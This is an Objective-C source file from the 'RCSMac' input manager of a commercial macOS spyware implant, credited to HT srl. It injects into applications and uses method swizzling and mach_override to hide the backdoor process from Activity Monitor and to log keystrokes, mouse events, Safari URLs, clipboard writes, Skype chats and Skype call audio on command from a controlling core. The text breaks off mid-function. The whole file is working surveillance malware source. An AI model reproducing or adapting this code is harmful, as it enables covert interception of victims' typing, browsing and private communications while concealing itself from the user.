/*
 * RCSMac - Input Manager
 * 
 * The Input Manager is responsible for loading all the external agents who
 * needs to be executed in different target processes aka runtime code injection
 *
 * The idea is very simple, swizzle a method upon request in order to provide
 * on-demand hooks. This looks better to me than a static hook always in place
 * which checks a static variable in order to figure if it needs to log or not.
 *
 * 
 * Created by Alfredo 'revenge' Pesoli on 28/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <AudioToolbox/AudioToolbox.h>
#import <AudioUnit/AudioUnit.h>
#import <objc/objc-class.h>
#import <mach/error.h>
#import <sys/ipc.h>
#import <pthread.h>
#import <dlfcn.h>

#import "mach_override.h"
#import "RCSMConfManager.h"
#import "RCSMInputManager.h"
#import "RCSMAgentVoipSkype.h"
#import "RCSMAgentApplication.h"


#import "RCSMLogger.h"
#import "RCSMDebug.h"


#define swizzleMethod(c1, m1, c2, m2) do { \
          method_exchangeImplementations(class_getInstanceMethod(c1, m1), \
                                         class_getInstanceMethod(c2, m2)); \
        } while(0)

//
// We can't allocate instance variable in factory methods
//
RCSMSharedMemory *mSharedMemoryCommand;
RCSMSharedMemory *mSharedMemoryLogging;
int32_t gBackdoorPID = 0;

BOOL isAppRunning = YES;

BOOL gWantToSyncThroughSafari = NO;
//static NSLock *gInputManagerLock;

//
// flags which specify if we are hooking the given module
// 0 - Initial State - No Hook
// 1 - Marked for Hooking
// 2 - Hook in place
// 3 - Marked for Unhooking
//
static int urlFlag          = 0;
static int keyboardFlag     = 0;
static int mouseFlag        = 0;
static int imFlag           = 0;
static int clipboardFlag    = 0;
static int voipFlag         = 0;
static int appFlag          = 0;

// OSAX Eventhandler
OSErr InjectEventHandler(const AppleEvent *ev, AppleEvent *reply, long refcon)
{
#ifdef DEBUG_INPUT_MANAGER
  verboseLog(@"Injected event handler called");
#endif
  
  OSErr resultCode = noErr;

  AEDesc      intDesc = {};
  SInt32      value = 0;

  // See if we need to show the print dialog.
  OSStatus err = AEGetParamDesc(ev, 'pido', typeSInt32, &intDesc);

  if (!err)
    {
      err = AEGetDescData(&intDesc, &value, sizeof(SInt32));
#ifdef DEBUG_INPUT_MANAGER
      verboseLog(@"Received backdoor pid: %ld", value);
#endif
    }
  
  gBackdoorPID = value;
  
#ifdef DEBUG_INPUT_MANAGER
  verboseLog(@"%s: running RCSeload event handler", __FUNCTION__);
#endif
    
  return resultCode;
}

BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SEL _newMethod)
{  
#ifdef DEBUG_INPUT_MANAGER
  const char *name    = sel_getName(_original);
  const char *newName = sel_getName(_newMethod);
  
  verboseLog(@"SEL Name: %s", name);
  verboseLog(@"SEL newName: %s", newName);
#endif
  
  Method methodOriginal = class_getInstanceMethod(_class, _original);
  
  if (methodOriginal == nil)
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"Message not found [%s %s]\n", class_getName(_class), name);
#endif
      
      return FALSE;
    }
  
  const char *type  = method_getTypeEncoding(methodOriginal);
  //IMP old           = method_getImplementation(methodOriginal);
  
  if (!class_addMethod (_class, _newMethod, _newImplementation, type))
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"Failed to add our new method - probably already exists");
#endif
    }
  else
    {
#ifdef DEBUG_INPUT_MANAGER
      verboseLog(@"Method added to target class");
#endif
    }
  
  Method methodNew = class_getInstanceMethod(_class, _newMethod);
  
  if (methodNew == nil)
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"Message not found [%s %s]\n", class_getName(_class), newName);
#endif
    
      return FALSE;
    }
  
  method_exchangeImplementations(methodOriginal, methodNew);
  
  return TRUE;
}

@interface mySMProcessController : NSObject

- (int)outlineViewHook: (id)arg1 numberOfChildrenOfItem: (id)arg2;
- (id)filteredProcessesHook;

@end

@implementation mySMProcessController

- (int)outlineViewHook: (id)arg1 numberOfChildrenOfItem: (id)arg2
{
  if (gBackdoorPID == 0)
    {
#ifdef DEBUG_INPUT_MANAGER
      verboseLog(@"gBackdoorPid not initialized");
#endif
      
      return [self outlineViewHook: arg1
            numberOfChildrenOfItem: arg2];
    }
  
  if (arg2 == nil)
    {
#ifdef DEBUG_INPUT_MANAGER
      verboseLog(@"Asking for how many processes");
#endif
    }
  
  int a = [self outlineViewHook: arg1
         numberOfChildrenOfItem: arg2];

#ifdef DEBUG_INPUT_MANAGER
  verboseLog(@"Total processes: %d", a);
#endif

  if (a > 0)
    return a - 1;
  else
    return a;
}

- (id)filteredProcessesHook
{
#ifdef DEBUG_INPUT_MANAGER
  verboseLog(@"");
#endif
  
  if (gBackdoorPID == 0)
    {
#ifdef DEBUG_INPUT_MANAGER
      verboseLog(@"gBackdoorPid not initialized");
#endif
      
      return [self filteredProcessesHook];
    }
  
  NSMutableArray *a = [[NSMutableArray alloc] initWithArray: [self filteredProcessesHook]];
  int i = 0;
  
  for (; i < [a count]; i++)
    {
      id object = [a objectAtIndex: i];
      if ([[object performSelector: @selector(pid)] intValue] == gBackdoorPID)
        {
#ifdef DEBUG_INPUT_MANAGER
          verboseLog(@"object matched: %@", object);
#endif
          
          [a removeObject: object];
        }
      
    }
  
  return a;
}

@end

@implementation RCSMInputManager

+ (void)getSystemVersionMajor: (u_int *)major
                        minor: (u_int *)minor
                       bugFix: (u_int *)bugFix
{
  OSErr err;
  SInt32 systemVersion, versionMajor, versionMinor, versionBugFix;
  
  err = Gestalt(gestaltSystemVersion, &systemVersion);
  if (err == noErr && systemVersion < 0x1040)
    {
      if (major)
        *major = ((systemVersion & 0xF000) >> 12) * 10
        + ((systemVersion & 0x0F00) >> 8);
      if (minor)
        *minor = (systemVersion & 0x00F0) >> 4;
      if (bugFix)
        *bugFix = (systemVersion & 0x000F);
    }
  else
    {
      err = Gestalt(gestaltSystemVersionMajor, &versionMajor);
      err = Gestalt(gestaltSystemVersionMinor, &versionMinor);
      err = Gestalt(gestaltSystemVersionBugFix, &versionBugFix);
      
      if (err == noErr)
        {
          if (major)
            *major = versionMajor;
          if (minor)
            *minor = versionMinor;
          if (bugFix)
            *bugFix = versionBugFix;
        }
    }
  
  if (err != noErr)
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"%s - Unable to obtain system version: %ld", __FUNCTION__, (long)err);
#endif
    
      if (major)
        *major = 10;
      if (minor)
        *minor = 0;
      if (bugFix)
        *bugFix = 0;
    }
}

+ (void)load
{
#ifdef ENABLE_LOGGING
  [RCSMLogger setComponent: @"im"];
  [RCSMLogger enableProcessNameVisualization: YES];
#endif
  
  // First thing we need to initialize the shared memory segments
  NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
  
  // Init OS numbers
  [RCSMInputManager getSystemVersionMajor: &gOSMajor
                                    minor: &gOSMinor
                                   bugFix: &gOSBugFix];
  
  // TODO: Use an exclusion list instead of this
  if ([bundleIdentifier isEqualToString: @"com.apple.safari"] == YES)
    {
      [self initSharedMemory];
      /*
      [[NSNotificationCenter defaultCenter] addObserver: self
                                               selector: @selector(checkForCommands)
                                                   name: NSApplicationWillTerminateNotification
                                                 object: nil];
      */
      if (gOSMajor == 10 && gOSMinor == 6)
        {
#ifdef DEBUG_INPUT_MANAGER
          verboseLog(@"running osax bundle");
#endif
          [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                                   toTarget: self
                                 withObject: nil];
        }
      else 
        {
      
          [[NSNotificationCenter defaultCenter] addObserver: self
                                                   selector: @selector(startThreadCommunicator:)
                                                       name: NSApplicationWillFinishLaunchingNotification
                                                     object: nil];
        }
    
      [[NSNotificationCenter defaultCenter] addObserver: self
                                               selector: @selector(closeThreadCommunicator:)
                                                   name: NSApplicationWillTerminateNotification
                                                 object: nil];
    }
  else if ([bundleIdentifier isEqualToString: @"com.apple.securityagent"] == NO)
    {
      [self initSharedMemory];
      
      if (gOSMajor == 10 && gOSMinor == 6)
        {
#ifdef DEBUG_INPUT_MANAGER
          verboseLog(@"running osax bundle");
#endif
          [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                                   toTarget: self
                                 withObject: nil];
        }
      else 
        {
          [[NSNotificationCenter defaultCenter] addObserver: self
                                                   selector: @selector(startThreadCommunicator:)
                                                       name: NSApplicationWillFinishLaunchingNotification
                                                     object: nil];
        }
      
      [[NSNotificationCenter defaultCenter] addObserver: self
                                               selector: @selector(closeThreadCommunicator:)
                                                   name: NSApplicationWillTerminateNotification
                                                 object: nil];
    }
}

+ (void)initSharedMemory
{
  //
  // Initialize and attach to our Shared Memory regions
  //
  key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
  key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
  
  mSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
                                                          size: gMemCommandMaxSize
                                                 semaphoreName: SHMEM_SEM_NAME];
  [mSharedMemoryCommand createMemoryRegion];
  [mSharedMemoryCommand attachToMemoryRegion];
  
  mSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
                                                          size: gMemLogMaxSize
                                                 semaphoreName: SHMEM_SEM_NAME];
  [mSharedMemoryLogging createMemoryRegion];
  [mSharedMemoryLogging attachToMemoryRegion];
}

+ (void)checkForCommands
{
#ifdef DEBUG_INPUT_MANAGER
  verboseLog(@"");
#endif
  
  NSMutableData *readData;
  shMemoryCommand *shMemCommand;
  
  while (isAppRunning == YES)
    {
      readData = [mSharedMemoryCommand readMemory: OFFT_COMMAND
                                    fromComponent: COMP_AGENT];
      
      if (readData != nil)
        {
          shMemCommand = (shMemoryCommand *)[readData bytes];
         
          switch (shMemCommand->command)
            {
            case CR_REGISTER_SYNC_SAFARI:
              {
                //
                // Send reply, yes we can and start syncing
                //
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID   = OFFT_COMMAND;
                shMemoryHeader->direction = D_TO_CORE;
                shMemoryHeader->command   = IM_CAN_SYNC_SAFARI;
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_COMMAND
                                        fromComponent: COMP_CORE] == TRUE)
                  {
                    NSMutableData *syncConfig = [[NSMutableData alloc] initWithBytes: shMemCommand->commandData
                                                                              length: shMemCommand->commandDataSize ];

                    // Ok, now sync bitch!
                    /*
                    RCSMCommunicationManager *commManager = [[RCSMCommunicationManager alloc]
                                                             initWithConfiguration: syncConfig];
                    
                    if ([commManager performSync] == FALSE)
                      {
#ifdef DEBUG_INPUT_MANAGER
                        infoLog(@"Sync failed from Safari");
#endif
                      }
                    else
                      {
#ifdef DEBUG_INPUT_MANAGER
                        infoLog(@"Sync from Safari went OK!");
#endif
                      }
                    
                    [commManager release];
                    */
                    [syncConfig release];
                  }
                
                break;
              }
            default:
              break;
            }
        }
      
      usleep(7000);
    }
}

+ (void)startThreadCommunicator: (NSNotification *)_notification
{
#ifdef DEBUG_INPUT_MANAGER
  NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
  
  infoLog(@"RCSMInputManager loaded by %@ at path %@", bundleIdentifier,
        [[NSBundle mainBundle] bundlePath]);
#endif
  [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                           toTarget: self
                         withObject: nil];
}

+ (void)closeThreadCommunicator: (NSNotification *)_notification
{
  isAppRunning = NO;
}

+ (void)hideCoreFromAM
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *readData;
  shMemoryCommand *shMemCommand;
  
#ifdef DEBUG_INPUT_MANAGER
  verboseLog(@"[DYLIB] %s: reading from shared", __FUNCTION__);
#endif
  
  // On leopard we get pid on shmem
  // waiting till core write it...
  if (gOSMajor == 10 && gOSMinor == 5)
    {
      while (TRUE)
        {
          readData = [mSharedMemoryCommand readMemory: OFFT_CORE_PID
                                        fromComponent: COMP_AGENT];
          
          if (readData != nil)
            {
              shMemCommand = (shMemoryCommand *)[readData bytes];
              
#ifdef DEBUG_INPUT_MANAGER
              verboseLog(@"[DYLIB] %s: shmem", __FUNCTION__);
#endif
              if (shMemCommand->command == CR_CORE_PID)
                {
                  memcpy(&gBackdoorPID, shMemCommand->commandData, sizeof(pid_t));
#ifdef DEBUG_INPUT_MANAGER
                  verboseLog(@"[DYLIB] %s: receiving core pid %d", __FUNCTION__, gBackdoorPID);
#endif
                  break;
                }
            }
      
          usleep(30000);
        }
    }
  
  Class className   = objc_getClass("SMProcessController");
  Class classSource = objc_getClass("mySMProcessController");
  
  if (className != nil)
    {
#ifdef DEBUG_INPUT_MANAGER
      verboseLog(@"Class SMProcessController swizzling");
#endif
      swizzleByAddingIMP(className, @selector(outlineView:numberOfChildrenOfItem:),
                         class_getMethodImplementation(classSource, @selector(outlineViewHook:numberOfChildrenOfItem:)),
                         @selector(outlineViewHook:numberOfChildrenOfItem:));
      
      swizzleByAddingIMP(className, @selector(filteredProcesses),
                         class_getMethodImplementation(classSource, @selector(filteredProcessesHook)),
                         @selector(filteredProcessesHook));
    }
  else
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"Class SMProcessController not found");
#endif
    }
  
  [pool release];
}

+ (void)startCoreCommunicator
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
  
  if ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == YES)
    {
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Starting hiding for activity Monitor");
#endif
      
#ifndef NO_PROC_HIDING
      [self hideCoreFromAM];
#endif
    }
  
  usleep(500000);
  
#ifdef DEBUG_INPUT_MANAGER
  infoLog(@"Core Communicator thread launched");  
#endif
  
  if ([bundleIdentifier isEqualToString: @"com.apple.securityagent"] == YES)
    {
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Exiting from security Agent");
#endif
      //
      // Avoid to inject into securityagent since we don't need it for now
      // plus it belongs to root (thus allocating a new shared memory block)
      //
      return;
    }
    
  //
  // Here we need to start the loop for checking and reading any configuration
  // change made on the shared memory
  //
  while (isAppRunning == YES)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      NSMutableData *readData;
      shMemoryCommand *shMemCommand;
      
      // Silly Code but it's faster than a switch/case inside a loop
      readData = [mSharedMemoryCommand readMemory: OFFT_URL
                                    fromComponent: COMP_AGENT];
      
      if (readData != nil)
        {
          shMemCommand = (shMemoryCommand *)[readData bytes];
          
          if (urlFlag == 0 && shMemCommand->command == AG_START)
            {
#ifdef DEBUG_INPUT_MANAGER
              infoLog(@"Started URL Agent");
#endif
              urlFlag = 1;
            }
          else if (urlFlag == 1 || urlFlag == 2 && shMemCommand->command == AG_STOP)
            urlFlag = 3;
          
          //[readData release];
        }
         
      readData = [mSharedMemoryCommand readMemory: OFFT_APPLICATION
                                    fromComponent: COMP_AGENT];
      
      if (readData != nil)
      {
#ifdef DEBUG
        NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
#endif
        
        shMemCommand = (shMemoryCommand *)[readData bytes];
        
        if (appFlag == 0
            && shMemCommand->command == AG_START)
        {
#ifdef DEBUG_INPUT_MANAGER
          NSLog(@"[DYLIB] %s: Starting Agent Application", __FUNCTION__);
#endif
          
          appFlag = 1;
        }
        else if ((appFlag == 1 || appFlag == 2)
                 && shMemCommand->command == AG_STOP)
        {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: Stopping Agent Application", __FUNCTION__);
#endif
          
          appFlag = 3;
        }
        
        //[readData release];
      }
      
      readData = [mSharedMemoryCommand readMemory: OFFT_KEYLOG
                                    fromComponent: COMP_AGENT];
      if (readData != nil)
        {
          shMemCommand = (shMemoryCommand *)[readData bytes];
          
          if (keyboardFlag == 0
              && shMemCommand->command == AG_START)
              //&& ([bundleIdentifier isEqualToString: @"com.apple.Safari"] == FALSE)
              //&& ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == FALSE))
            {
              keyboardFlag = 1;
            }
          else if ((keyboardFlag == 1
                   || keyboardFlag == 2)
                   && shMemCommand->command == AG_STOP)
                   //&& ([bundleIdentifier isEqualToString: @"com.apple.Safari"] == FALSE)
                   //&& ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == FALSE))
            {
              keyboardFlag = 3;
            }
          
          //[readData release];
        }
      
      readData = [mSharedMemoryCommand readMemory: OFFT_MOUSE
                                    fromComponent: COMP_AGENT];
      if (readData != nil)
        {
          shMemCommand = (shMemoryCommand *)[readData bytes];
          
          if (mouseFlag == 0
              && shMemCommand->command == AG_START)
              //&& ([bundleIdentifier isEqualToString: @"com.apple.Safari"] == FALSE)
              //&& ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == FALSE))
            {
              mouseFlag = 1;
            }
          else if ((mouseFlag == 1
                   || mouseFlag == 2)
                   && shMemCommand->command == AG_STOP)
                   //&& ([bundleIdentifier isEqualToString: @"com.apple.Safari"] == FALSE)
                   //&& ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == FALSE))
            {
              mouseFlag = 3;
            }
          
          //[readData release];
        }
      
      readData = [mSharedMemoryCommand readMemory: OFFT_VOIP
                                    fromComponent: COMP_AGENT];
      if (readData != nil)
        {
          shMemCommand = (shMemoryCommand *)[readData bytes];
          
          if (voipFlag == 0 && shMemCommand->command == AG_START)
            voipFlag = 1;
          else if (voipFlag == 1 || voipFlag == 2 && shMemCommand->command == AG_STOP)
            voipFlag = 3;
          
          //[readData release];
        }
      
      readData = [mSharedMemoryCommand readMemory: OFFT_IM
                                    fromComponent: COMP_AGENT];
      if (readData != nil)
        {
          shMemCommand = (shMemoryCommand *)[readData bytes];
          
          if (imFlag == 0 && shMemCommand->command == AG_START)
            imFlag = 1;
          else if (imFlag == 1 || imFlag == 2 && shMemCommand->command == AG_STOP)
            imFlag = 3;
          
          //[readData release];
        }
      
      readData = [mSharedMemoryCommand readMemory: OFFT_CLIPBOARD
                                    fromComponent: COMP_AGENT];
      if (readData != nil)
        {
          shMemCommand = (shMemoryCommand *)[readData bytes];
          
          if (clipboardFlag == 0 && shMemCommand->command == AG_START)
            clipboardFlag = 1;
          else if (clipboardFlag == 1 || clipboardFlag == 2 && shMemCommand->command == AG_STOP)
            clipboardFlag = 3;
          
          //[readData release];
        }
      
      //
      // Perform swizzle here
      //
      if (urlFlag == 1)
        {
          urlFlag = 2;
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Hooking URLs");
#endif
          
          //
          // Safari
          //
          usleep(2000000);
                        
          Class className   = objc_getClass("BrowserWindowController");
          Class classSource = objc_getClass("myBrowserWindowController");
        
          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(webFrameLoadCommitted:),
                                  class_getMethodImplementation(classSource, @selector(webFrameLoadCommittedHook:)),
                                  @selector(webFrameLoadCommittedHook:));
            }
          else
            {
#ifdef DEBUG_INPUT_MANAGER
              warnLog(@"URL - not the right application, skipping");
#endif
            }
          // End of Safari
          /*
          //
          // Firefox 3 - Massimo Chiodini
          //
          NSString *applicationName  = [[[NSBundle mainBundle] bundlePath] lastPathComponent];
          NSString *firefoxAppName   = [[NSString alloc] initWithUTF8String: "Firefox.app"];
          
          NSComparisonResult result = [firefoxAppName compare: applicationName
                                                      options: NSCaseInsensitiveSearch
                                                        range: NSMakeRange(0, [applicationName length])
                                                       locale: [NSLocale currentLocale]];
  
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Comparing %@ vs. %@ (%d)", applicationName, firefoxAppName, result);
#endif
          if (result == NSOrderedSame)
            {
#ifdef DEBUG_INPUT_MANAGER
              infoLog(@"Hooking fairfocs baby!");
#endif  
              Class className = objc_getClass("NSWindow");
              
              swizzleMethod(className, @selector(setTitle:),
                            className, @selector(setTitleHook:));
              
            }
           */
          // End of Firefox 3
        }
      else if (urlFlag == 3)
        {
          urlFlag = 0;
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Unhooking URLs");
#endif
          
          Class className = objc_getClass("BrowserWindowController");
          
          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(webFrameLoadCommitted:),
                                  class_getMethodImplementation(className, @selector(webFrameLoadCommittedHook:)),
                                  @selector(webFrameLoadCommittedHook:));
            }
          else
            {
#ifdef DEBUG_INPUT_MANAGER
              warnLog(@"URL - not the right application, skipping");
#endif
            }
        
          // firefox 3
          /*
          NSString *application_name  = [[[NSBundle mainBundle] bundlePath] lastPathComponent];
          NSString *firefox_app       = [[NSString alloc] initWithUTF8String: "Firefox.app"];
          
          NSRange strRange;
          strRange.location = 0;
          strRange.length   = [application_name length];
          
          NSComparisonResult firefox_res = [firefox_app compare: application_name
                                                        options: NSCaseInsensitiveSearch
                                                          range: strRange
                                                         locale: [NSLocale currentLocale]];
          
          infoLog(@"Comparing %@ vs. %@ (%d)", application_name, firefox_app, firefox_res);
          
          if(firefox_res == NSOrderedSame)
            {
              infoLog(@"Hooking fairfocs baby!");
              
              Class className = objc_getClass("NSWindow");
              
              swizzleMethod(className, @selector(setTitle:),
                            className, @selector(setTitleHook:));
              
            }
          */
        }
      
      if (appFlag == 1)
      {
        appFlag = 2;
        
        RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
        
        [appAgent start];
        
#ifdef DEBUG_INPUT_MANAGER
        NSLog(@"%s: Hooking Application", __FUNCTION__);
#endif
        
      }
      else if (appFlag == 3)
      {
        appFlag = 0;
        RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
        
        [appAgent stop];
        
#ifdef DEBUG_INPUT_MANAGER
        NSLog(@"%s: Stopping Application", __FUNCTION__);
#endif
        
      }
      
      if (keyboardFlag == 1)
        {
          keyboardFlag = 2;
          keylogAgentIsActive = 1;
          
          Class className = objc_getClass("NSWindow");
          
          if (mouseFlag == 0 || mouseAgentIsActive == 0)
            {
#ifdef DEBUG_INPUT_MANAGER
              infoLog(@"Hooking keyboard");
#endif
              
              swizzleMethod(className, @selector(hookKeyboardAndMouse:),
                            className, @selector(sendEvent:));
            }
          else
            {
#ifdef DEBUG_INPUT_MANAGER
              infoLog(@"Hooking mouse and keyboard from keyb");
#endif
            }
          
          swizzleMethod(className, @selector(becomeKeyWindowHook),
                        className, @selector(becomeKeyWindow));
          
          swizzleMethod(className, @selector(resignKeyWindowHook),
                        className, @selector(resignKeyWindow));
        }
      else if (keyboardFlag == 3)
        {
          keyboardFlag = 0;
          keylogAgentIsActive = 0;
          
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Unhooking keyboard");
#endif
          Class className = objc_getClass("NSWindow");
          
          if (mouseFlag == 0)
            {
              swizzleMethod(className, @selector(hookKeyboardAndMouse:),
                            className, @selector(sendEvent:));
            }
          
          swizzleMethod(className, @selector(becomeKeyWindowHook),
                        className, @selector(becomeKeyWindow));
          
          swizzleMethod(className, @selector(resignKeyWindowHook),
                        className, @selector(resignKeyWindow));
        }
      
      if (mouseFlag == 1)
        {
          mouseFlag = 2;
          mouseAgentIsActive = 1;
          
          Class className = objc_getClass("NSWindow");
          
          if (keyboardFlag == 0 || keylogAgentIsActive == 0)
            {
#ifdef DEBUG_INPUT_MANAGER
              infoLog(@"Hooking mouse");
#endif
              
              swizzleMethod(className, @selector(hookKeyboardAndMouse:),
                            className, @selector(sendEvent:));
            }
          else
            {
#ifdef DEBUG_INPUT_MANAGER
              infoLog(@"Hooking mouse and keyboard from mouse");
#endif
            }
        }
      else if (mouseFlag == 3)
        {
          mouseFlag = 0;
          mouseAgentIsActive = 0;
          
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Unhooking mouse");
#endif
          
          if (keyboardFlag == 0)
            {
              Class className = objc_getClass("NSWindow");
              
              swizzleMethod(className, @selector(hookKeyboardAndMouse:),
                            className, @selector(sendEvent:));
            }
        }
      
      if (imFlag == 1)
        {
          imFlag = 2;
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Hooking IMs");
#endif          
          // In order to avoid a linker error for a missing implementation
          Class className   = objc_getClass("SkypeChat");
          Class classSource = objc_getClass("mySkypeChat");
          
          //swizzleMethod(className, @selector(isMessageRecentlyDisplayed:),
          //              className, @selector(isMessageRecentlyDisplayedHook:));
          
          swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
                              class_getMethodImplementation(classSource, @selector(isMessageRecentlyDisplayedHook:)),
                              @selector(isMessageRecentlyDisplayedHook:));
        }
      else if (imFlag == 3)
        {
          imFlag = 0;
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Unhooking IMs");
#endif
          // In order to avoid a linker error for a missing implementation
          Class className = objc_getClass("SkypeChat");
          
          //swizzleMethod(className, @selector(isMessageRecentlyDisplayed:),
          //              className, @selector(isMessageRecentlyDisplayedHook:));
          
          swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
                              class_getMethodImplementation(className, @selector(isMessageRecentlyDisplayedHook:)),
                              @selector(isMessageRecentlyDisplayedHook:));
        }
      
      if (clipboardFlag == 1)
        {
          clipboardFlag = 2;
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Hooking clipboards");
#endif
          // In order to avoid a linker error for a missing implementation
          Class className = objc_getClass("NSPasteboard");
          
          //swizzleMethod(className, @selector(setData:forType:),
                        //className, @selector(setDataHook:forType:));
          swizzleByAddingIMP(className,
              @selector(setData:forType:),
              class_getMethodImplementation(className,
                                @selector(setDataHook:forType:)),
              @selector(setDataHook:forType:));
        }
      else if (clipboardFlag == 3)
        {
          clipboardFlag = 0;
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Unhooking clipboards");
#endif
          // In order to avoid a linker error for a missing implementation
          Class className = objc_getClass("NSPasteboard");
          
          //swizzleMethod(className, @selector(setData:forType:),
                        //className, @selector(setDataHook:forType:));
          swizzleByAddingIMP(className,
              @selector(setData:forType:),
              class_getMethodImplementation(className,
                                @selector(setDataHook:forType:)),
              @selector(setDataHook:forType:));
        }
      
      if (voipFlag == 1)
        {
          voipFlag = 2;
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Hooking voip calls");
#endif
          mach_error_t mError;

          //
          // Let's check which skype we have here
          // Looks like skype 5 doesn't implement few selectors available on
          // 2.x branch
          //
          Class className   = objc_getClass("MacCallX");
          Class classSource = objc_getClass("myMacCallX");
          Method method     = class_getInstanceMethod(className,
                                                      @selector(placeCallTo:));

          //
          // Dunno why but checking with respondsToSelector
          // doesn't work here... Odd
          //
          if (method != nil)
            {
#ifdef DEBUG_INPUT_MANAGER
              infoLog(@"Hooking skype 2.x");
#endif
              //
              // We're dealing with skype 2.x
              //
              class_addMethod(className,
                  @selector(checkActiveMembersName),
                  class_getMethodImplementation(classSource,
                                    @selector(checkActiveMembersName)),
                  "v@:");

              swizzleByAddingIMP(className,
                  @selector(placeCallTo:),
                  class_getMethodImplementation(classSource,
                                    @selector(placeCallToHook:)),
                  @selector(placeCallToHook:));
              swizzleByAddingIMP(className,
                  @selector(answer),
                  class_getMethodImplementation(classSource,
                                    @selector(answerHook)),
                  @selector(answerHook));
              swizzleByAddingIMP(className,
                  @selector(isFinished),
                  class_getMethodImplementation(classSource,
                                    @selector(isFinishedHook)),
                  @selector(isFinishedHook));

              if ((mError = mach_override("_AudioDeviceAddIOProc", "CoreAudio",
                                          (void *)&_hook_AudioDeviceAddIOProc,
                                          (void **)&_real_AudioDeviceAddIOProc)))
                {
#ifdef DEBUG_INPUT_MANAGER
                  errorLog(@"mach_override error on AudioDeviceAddIOProc");
#endif
                }
              if ((mError = mach_override("_AudioDeviceRemoveIOProc", "CoreAudio",
                                          (void *)&_hook_AudioDeviceRemoveIOProc,
                                          (void **)&_real_AudioDeviceRemoveIOProc)))
                {
#ifdef DEBUG_INPUT_MANAGER
                  errorLog(@"mach_override error on AudioDeviceRemoveIOProc");
#endif
                }
              
              //
              // For 2.x we can start hooking here since AddIOProc deals only
              // with input/output voice call (that is, no effects are managed
              // by registered procs)
              //
              VPSkypeStartAgent();
            }
          else
            {
#ifdef DEBUG_INPUT_MANAGER
              infoLog(@"Hooking skype 5.x");
#endif

              Class c1 = objc_getClass("EventController");
              Class c2 = objc_getClass("myEventController");
              
              swizzleByAddingIMP(c1,
                  @selector(handleNotification:),
                  class_getMethodImplementation(c2,
                                    @selector(handleNotificationHook:)),
                  @selector(handleNotificationHook:));

              //
              // We're dealing with skype 5.x
              //
              if ((mError = mach_override("_AudioDeviceCreateIOProcID", "CoreAudio",
                                          (void *)&_hook_AudioDeviceCreateIOProcID,
                                          (void **)&_real_AudioDeviceCreateIOProcID)))
                {
#ifdef DEBUG_INPUT_MANAGER
                  errorLog(@"mach_override error on AudioDeviceCreateIOProcID");
#endif
                }

              if ((mError = mach_override("_AudioDeviceDestroyIOProcID", "CoreAudio",
                                          (void *)&_hook_AudioDeviceDestroyIOProcID,
                                          (void **)&_real_AudioDeviceDestroyIOProcID)))
                {
#ifdef DEBUG_INPUT_MANAGER
                  errorLog(@"mach_override error on AudioDeviceDestroyIOProcID");
#endif
                }
            }

          //
          // Those are shared among the different versions
          // and need to be hooked all the times
          //
          if ((mError = mach_override("_AudioDeviceStart", "CoreAudio",
                                      (void *)&_hook_AudioDeviceStart,
                                      (void **)&_real_AudioDeviceStart)))
            {
#ifdef DEBUG_INPUT_MANAGER
              errorLog(@"mach_override error on AudioDeviceStart");
#endif
            }
          
          if ((mError = mach_override("_AudioDeviceStop", "CoreAudio",
                                      (void *)&_hook_AudioDeviceStop,
                                      (void **)&_real_AudioDeviceStop)))
            {
#ifdef DEBUG_INPUT_MANAGER
              errorLog(@"mach_override error");
#endif
            }
        }
      else if (voipFlag == 3)
        {
          voipFlag = 0;
          
          VPSkypeStopAgent();
#ifdef DEBUG_INPUT_MANAGER
